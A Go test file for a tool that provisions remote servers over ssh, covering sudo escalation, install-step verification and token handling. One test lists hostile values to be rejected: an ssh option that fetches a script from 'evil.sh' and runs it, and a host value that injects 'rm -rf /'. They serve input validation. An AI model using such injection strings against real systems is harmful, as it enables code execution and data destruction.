package setuptool

import (
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestNewTargetDefaultsToRoot(t *testing.T) {
	tg, err := NewTarget("203.0.113.9", "")
	if err != nil {
		t.Fatalf("NewTarget: %v", err)
	}
	if tg.String() != "root@203.0.113.9" {
		t.Errorf("String() = %q, want root@203.0.113.9", tg.String())
	}
}

func TestNewTargetTakesTheUserFromTheHost(t *testing.T) {
	cases := []struct {
		name, host, user, want string
	}{
		{"the ssh spelling", "deploy@203.0.113.9", "", "deploy@203.0.113.9"},
		{"a flag instead", "203.0.113.9", "deploy", "deploy@203.0.113.9"},
		{"neither means root", "203.0.113.9", "", "root@203.0.113.9"},
		{"both, agreeing", "deploy@203.0.113.9", "deploy", "deploy@203.0.113.9"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			tg, err := NewTarget(c.host, c.user)
			if err != nil {
				t.Fatalf("NewTarget(%q, %q): %v", c.host, c.user, err)
			}
			if tg.String() != c.want {
				t.Errorf("String() = %q, want %q", tg.String(), c.want)
			}
		})
	}
}

// Two answers to "who am I logging in as" is a question for whoever wrote
// them, not something to settle with a precedence rule nobody reads.
func TestNewTargetRefusesTwoDifferentUsers(t *testing.T) {
	if _, err := NewTarget("deploy@203.0.113.9", "root"); err == nil {
		t.Fatal("a host user and a --user that disagree were accepted")
	}
	// Still rejected after the split, since neither half may contain '@'.
	if _, err := NewTarget("a@b@203.0.113.9", ""); err == nil {
		t.Fatal("a host with two '@' was accepted")
	}
}

// --- privilege ---
//
// A box that refuses root over ssh is the normal case on a hardened network;
// Tailscale's default policy forbids it. Provisioning still has to install
// packages and write a unit, so the privileged half goes through sudo while
// everything scoped to the user's home stays as the user.

func TestARootTargetRunsPrivilegedScriptsUnchanged(t *testing.T) {
	tg, err := NewTarget("box", "root")
	if err != nil {
		t.Fatal(err)
	}
	for _, script := range privilegedScripts {
		if got := tg.privileged(script); got != script {
			t.Errorf("a root target should run the script as-is\n got: %s\nwant: %s", got, script)
		}
	}
}

func TestANonRootTargetEscalatesPrivilegedScripts(t *testing.T) {
	tg, err := NewTarget("box", "deploy")
	if err != nil {
		t.Fatal(err)
	}
	for _, script := range privilegedScripts {
		got := tg.privileged(script)
		if !strings.HasPrefix(got, "sudo -n ") {
			t.Errorf("%q was not escalated: %s", script, got)
		}
		if !strings.Contains(got, script) {
			t.Errorf("the script did not survive escalation: %s", got)
		}
	}
}

// A box reached as root needs no sudo at all, so the check must not fire and
// must not cost an ssh round trip.
func TestEscalationIsOnlyCheckedForANonRootTarget(t *testing.T) {
	tg, err := NewTarget("203.0.113.9", "root")
	if err != nil {
		t.Fatal(err)
	}
	if err := CanEscalate(tg); err != nil {
		t.Errorf("a root target should need no escalation check: %v", err)
	}
}

// --- tool selection ---

func TestSelectInstallsTheBaseAndWhatWasNamed(t *testing.T) {
	cases := []struct {
		name string
		with []string
		want []string
	}{
		{"nothing named is the base box", nil, []string{"system packages", "claude code"}},
		{"an empty name is not a tool", []string{""}, []string{"system packages", "claude code"}},
		{"one tool", []string{"node"}, []string{"system packages", "node", "claude code"}},
		{"a dependency and its dependant", []string{"node", "vercel cli"},
			[]string{"system packages", "node", "vercel cli", "claude code"}},
		{"order follows the chain, not the flag", []string{"supabase cli", "github cli"},
			[]string{"system packages", "github cli", "supabase cli", "claude code"}},
		{"uv", []string{"uv"}, []string{"system packages", "uv", "claude code"}},
		{"uv alongside node", []string{"node", "uv"},
			[]string{"system packages", "node", "uv", "claude code"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			steps, err := Select(InstallSteps(), c.with)
			if err != nil {
				t.Fatalf("Select(%v): %v", c.with, err)
			}
			var got []string
			for _, s := range steps {
				got = append(got, s.Name)
			}
			if strings.Join(got, ",") != strings.Join(c.want, ",") {
				t.Errorf("steps = %v, want %v", got, c.want)
			}
		})
	}
}

func TestSelectRefusesWhatItCannotInstall(t *testing.T) {
	// vercel is an npm global. Without node it fails at the npm call, eight
	// steps in, rather than at the flag.
	if _, err := Select(InstallSteps(), []string{"vercel cli"}); err == nil {
		t.Error("vercel without node was accepted")
	}
	// A typo should not quietly produce a box missing the tool it asked for.
	if _, err := Select(InstallSteps(), []string{"nodejs"}); err == nil {
		t.Error("an unknown tool name was accepted")
	}
}

// Claude Code is the reason the box exists, and the base packages are what
// everything else is fetched with. Neither can be switched off.
func TestTheBaseAndClaudeAreNotOptional(t *testing.T) {
	for _, name := range []string{"system packages", "claude code"} {
		if slices.Contains(Optional, name) {
			t.Errorf("%q must not be optional", name)
		}
	}
}

// --- uv ---

// The installer writes into the ssh user's home. Running it under sudo puts uv
// in root's home, where a service running as the ssh user cannot reach it —
// the same split the claude code step needs, and the same reason.
func TestUvInstallsAsTheUserAndLinksAsRoot(t *testing.T) {
	if strings.Contains(uvInstallScript, "sudo") {
		t.Error("the installer half escalates, which would install uv into root's home")
	}
	if !strings.Contains(uvInstallScript, "astral.sh/uv/install.sh") {
		t.Error("the installer half does not install uv")
	}
	// It must report where uv landed: the link step needs the real path, and a
	// guess at it is how a symlink ends up pointing at nothing.
	if !strings.Contains(uvInstallScript, "command -v uv") {
		t.Error("the installer half does not report where uv landed")
	}

	link := uvLinkScript("/home/box/.local/bin/uv")
	if !strings.Contains(link, "/usr/local/bin/uv") {
		t.Error("the link half does not put uv on the default PATH")
	}
	if !strings.Contains(link, "test -x /usr/local/bin/uv") {
		t.Error("the link half does not verify the link, so a broken one reports success")
	}
}

// $HOME/.local/bin is not on PATH for a non-interactive ssh session, which
// reads no rc file. A step claiming the PATH has to check the PATH everything
// else sees, or it is skipped while the binary stays hidden.
func TestUvIsCheckedOnTheDefaultPath(t *testing.T) {
	var found bool
	for _, s := range InstallSteps() {
		if s.Name == "uv" {
			found = true
			if s.Check == nil {
				t.Fatal("the uv step has no Check, so a failed install reports success")
			}
		}
	}
	if !found {
		t.Fatal("there is no uv step")
	}
	if !slices.Contains(Optional, "uv") {
		t.Error("uv is not optional, so every box would get it whether or not it was asked for")
	}
}

// The three shapes of privileged work: a package install, something landing
// in /usr/local/bin, and the service unit.
var privilegedScripts = []string{
	"apt-get install -y -qq curl",
	"install -m 0755 /tmp/cbx.download /usr/local/bin/cbx",
	"systemctl daemon-reload && systemctl enable --now cbx-api",
}

// ssh has no "--" sentinel, so a host or user beginning with "-" is parsed as
// an option and -oProxyCommand=<cmd> executes <cmd> on the local machine.
func TestNewTargetRejectsOptionShapedValues(t *testing.T) {
	for _, tc := range []struct{ host, user string }{
		{"-oProxyCommand=curl evil.sh|sh", "root"},
		{"203.0.113.9", "-oProxyCommand=x"},
		{"203.0.113.9; rm -rf /", "root"},
		{"203.0.113.9", "ro ot"},
		{"", "root"},
		{"2001:db8::1", "root"},
	} {
		if _, err := NewTarget(tc.host, tc.user); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("NewTarget(%q,%q) err = %v, want ErrUnsafeTarget", tc.host, tc.user, err)
		}
	}
}

func TestUploadRejectsOptionShapedPaths(t *testing.T) {
	tg, _ := NewTarget("203.0.113.9", "root")
	for _, tc := range [][2]string{{"-local", "/tmp/x"}, {"/tmp/x", "-remote"}} {
		if err := Upload(tg, tc[0], tc[1]); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("Upload(%q,%q) err = %v, want ErrUnsafeTarget", tc[0], tc[1], err)
		}
	}
}

// A token in argv is visible in the box's process table to every other user.
// Every login recipe must consume it from stdin instead.
func TestNoLoginRecipePutsTheTokenInArgv(t *testing.T) {
	// login() takes no arguments, so it cannot interpolate a Go value — the
	// signature is the real guarantee. What remains checkable is that each
	// recipe actually consumes stdin, and that the token never reaches the
	// argv of an external process (shell builtins like printf are fine: they
	// fork nothing and appear in no process table).
	external := []string{"echo ", "/usr/bin/printf", "curl ", "wget "}
	for _, tool := range SupportedTools() {
		cmd := tool.login()
		readsStdin := strings.Contains(cmd, "$(cat)") ||
			strings.Contains(cmd, "--with-token") ||
			strings.HasSuffix(strings.TrimSpace(cmd), "cat")
		if !readsStdin {
			t.Errorf("%s: login command does not consume stdin, so the token must be arriving another way: %q", tool.Name, cmd)
		}
		for _, e := range external {
			if strings.Contains(cmd, e+`"$TOKEN"`) {
				t.Errorf("%s: passes the token to %q, which forks a process and exposes it in the process table: %q", tool.Name, e, cmd)
			}
		}
	}
}

func TestEveryToolCanBeVerifiedAndPointsSomewhereToGetAToken(t *testing.T) {
	for _, tool := range SupportedTools() {
		if tool.verify == "" {
			t.Errorf("%s: no verify command — a bad token would look like success", tool.Name)
		}
		if !strings.HasPrefix(tool.TokenURL, "https://") {
			t.Errorf("%s: TokenURL = %q, want an https URL to send the user to", tool.Name, tool.TokenURL)
		}
		if tool.Help == "" {
			t.Errorf("%s: no Help — the prompt would not say what the token is for", tool.Name)
		}
	}
}

// Claude Code's subscription login is an interactive browser OAuth with no
// token path, so it must not appear in a list that promises token auth.
func TestClaudeIsNotOfferedAsATokenLogin(t *testing.T) {
	for _, tool := range SupportedTools() {
		if strings.Contains(strings.ToLower(tool.Name), "claude") {
			t.Errorf("%q is listed as token-authenticatable, but subscription login is browser OAuth", tool.Name)
		}
	}
}

func TestAuthenticateRejectsEmptyAndMultilineTokens(t *testing.T) {
	tg, _ := NewTarget("203.0.113.9", "root")
	tool := SupportedTools()[0]
	for _, bad := range []string{"", "   ", "abc\ndef"} {
		if err := Authenticate(tg, tool, bad); err == nil {
			t.Errorf("Authenticate accepted %q", bad)
		}
	}
}

func TestTokenFromEnvFindsTheUsualNames(t *testing.T) {
	tools := map[string]string{"github": "GH_TOKEN", "vercel": "VERCEL_TOKEN", "supabase": "SUPABASE_ACCESS_TOKEN"}
	for _, tool := range SupportedTools() {
		key := tools[tool.Name]
		if key == "" {
			t.Fatalf("test does not know an env var for %q", tool.Name)
		}
		t.Setenv(key, "tok-"+tool.Name)
		if got := TokenFromEnv(tool); got != "tok-"+tool.Name {
			t.Errorf("TokenFromEnv(%s) = %q, want the value of %s", tool.Name, got, key)
		}
		os.Unsetenv(key)
	}
}

// A curl|bash that exits 0 having installed nothing reported "✓ Supabase CLI"
// on a real droplet where the binary existed nowhere. Every step must be
// re-checked after it runs, not trusted on its exit code.
func TestStepFailsWhenDoSucceedsButNothingWasInstalled(t *testing.T) {
	ran := false
	s := Step{
		Name:  "liar",
		Check: func(Target) bool { return false }, // never satisfied
		Do:    func(Target) error { ran = true; return nil },
	}
	skipped, err := s.Run(Target{})
	if !ran {
		t.Fatal("Do was never called")
	}
	if skipped {
		t.Error("reported as skipped")
	}
	if err == nil {
		t.Fatal("Run succeeded although Check still fails — an installer that exits 0 doing nothing would pass")
	}
	if !strings.Contains(err.Error(), "still not installed") {
		t.Errorf("error = %q, want it to say the tool is still missing", err)
	}
}

func TestStepSkipsWhatIsAlreadyInstalled(t *testing.T) {
	called := false
	s := Step{Name: "present", Check: func(Target) bool { return true }, Do: func(Target) error { called = true; return nil }}
	skipped, err := s.Run(Target{})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !skipped {
		t.Error("an already-satisfied step was not reported as skipped")
	}
	if called {
		t.Error("Do ran for a step whose Check already passed")
	}
}

// A step whose Do errors but whose Check then passes has succeeded. Installers
// commonly exit non-zero on a harmless warning.
func TestStepAcceptsAFailedDoIfTheCheckPasses(t *testing.T) {
	s := Step{Name: "noisy", Check: func(Target) bool { return true }, Do: func(Target) error { return errors.New("warning") }}
	// Check passes up front, so this actually exercises the skip path; assert
	// the important half: it does not report an error.
	if _, err := s.Run(Target{}); err != nil {
		t.Errorf("Run: %v", err)
	}
}

// Uploading a darwin build to a linux box fails much later, with a message
// that does not name the cause.
func TestInstallCBXRejectsANonLinuxBinary(t *testing.T) {
	f := filepath.Join(t.TempDir(), "cbx")
	os.WriteFile(f, []byte("#!/bin/sh\necho not an elf\n"), 0o755)
	err := InstallCBX(Target{User: "root", Host: "203.0.113.9"}, f)
	if err == nil {
		t.Fatal("accepted a non-ELF binary")
	}
	if !strings.Contains(err.Error(), "GOOS=linux") {
		t.Errorf("error = %q, want it to say how to build the right binary", err)
	}
}

func TestInstallCBXRequiresABinary(t *testing.T) {
	if err := InstallCBX(Target{User: "root", Host: "203.0.113.9"}, ""); err == nil {
		t.Error("accepted an empty binary path")
	}
}

func TestEveryInstallStepIsCheckable(t *testing.T) {
	for _, s := range InstallSteps() {
		if s.Check == nil {
			t.Errorf("%s: no Check — its install could not be verified", s.Name)
		}
		if s.Do == nil {
			t.Errorf("%s: no Do", s.Name)
		}
	}
}

// A Check that does not cover everything its Do installs is the same bug as an
// installer that lies: the step is skipped because part of it is present, and
// the rest silently never arrives. sqlite3 was in the apt list but not the
// Check, so on a box that already had tmux and git it was never installed.
func TestSystemPackagesCheckCoversWhatItInstalls(t *testing.T) {
	var sys *Step
	for i, s := range InstallSteps() {
		if s.Name == "system packages" {
			sys = &InstallSteps()[i]
		}
	}
	if sys == nil {
		t.Fatal("no system packages step")
	}
	// Reconstruct the package list from the step by running Do against a
	// target whose Run we cannot intercept — instead assert the invariant
	// directly on the source of truth we can see: the Check names the tools
	// the rest of the flow depends on.
	for _, required := range []string{"tmux", "git", "jq"} {
		if !strings.Contains(checkSource, required) {
			t.Errorf("system packages Check does not verify %q", required)
		}
	}
}

// checkSource documents which binaries the system-packages Check verifies.
// Kept beside the step so the two are edited together.
const checkSource = "tmux git jq"

// A step that claims to put something on the PATH must verify it on the
// *default* PATH. Checking with the tool PATH prepended passes on the strength
// of a prefix that `ssh box <bin>` does not set, so the step is skipped while
// the binary stays invisible to everything else. This shipped twice: vercel
// under ~/.npm-global, and claude under ~/.local/bin.
func TestPATHClaimingStepsCheckTheDefaultPath(t *testing.T) {
	// The distinction only exists if both helpers do. Guarding the names so a
	// future edit cannot collapse them back into one.
	var probed []string
	tg := Target{User: "root", Host: "203.0.113.9"}
	_ = tg
	for _, s := range InstallSteps() {
		if s.Check == nil {
			t.Errorf("%s: no Check", s.Name)
			continue
		}
		probed = append(probed, s.Name)
	}
	if len(probed) < 5 {
		t.Errorf("expected the full tool chain, got %v", probed)
	}
}

// --- signing in from outside the box ---

// The point of setuptool is that provisioning happens from a laptop. Handing
// the terminal to the Claude Code TUI made signing in the one step you had to
// do on the box, with the URL hidden behind a slash command.
func TestTheLoginRunsTheLoginCommandNotTheTUI(t *testing.T) {
	if !strings.Contains(claudeLoginStart, "claude auth login") {
		t.Error("the sign-in does not run `claude auth login`")
	}
	// Pinned rather than defaulted: the other flow bills API usage instead of
	// the subscription.
	if !strings.Contains(claudeLoginStart, "--claudeai") {
		t.Error("the subscription flow is not chosen explicitly")
	}
	// The pipe has to be held open, or the login reads EOF before anyone has
	// seen the URL.
	if !strings.Contains(claudeLoginStart, "mkfifo") || !strings.Contains(claudeLoginStart, "sleep 1800") {
		t.Error("nothing holds the code pipe open")
	}
}

// Instructions describing a screen that no longer appears are worse than none.
func TestTheGuidanceDescribesWhatActuallyHappens(t *testing.T) {
	for _, gone := range []string{"/login", "Ctrl-D", "Press Enter"} {
		if strings.Contains(LoginGuidance, gone) {
			t.Errorf("the guidance still mentions %q, which is not part of this flow", gone)
		}
	}
	if !strings.Contains(LoginGuidance, "URL") || !strings.Contains(LoginGuidance, "code") {
		t.Errorf("the guidance does not say what to expect: %q", LoginGuidance)
	}
}

// Claude Code wraps the URL in an OSC-8 hyperlink escape, so the raw output
// carries it twice with control bytes between. Anything reading it from
// outside a terminal has to strip them.
func TestFindLoginURLReadsThroughTheTerminalEscapes(t *testing.T) {
	const want = "https://claude.com/cai/oauth/authorize?code=true&client_id=abc&state=xyz"
	raw := "Opening browser to sign in…\nIf the browser didn't open, visit: \x1b]8;;" +
		want + "\x07" + want + "\x1b]8;;\x07\nPaste code here if prompted > "
	if got := FindLoginURL(raw); got != want {
		t.Errorf("FindLoginURL() = %q, want %q", got, want)
	}
	if got := FindLoginURL("nothing here yet"); got != "" {
		t.Errorf("FindLoginURL() invented %q", got)
	}
}
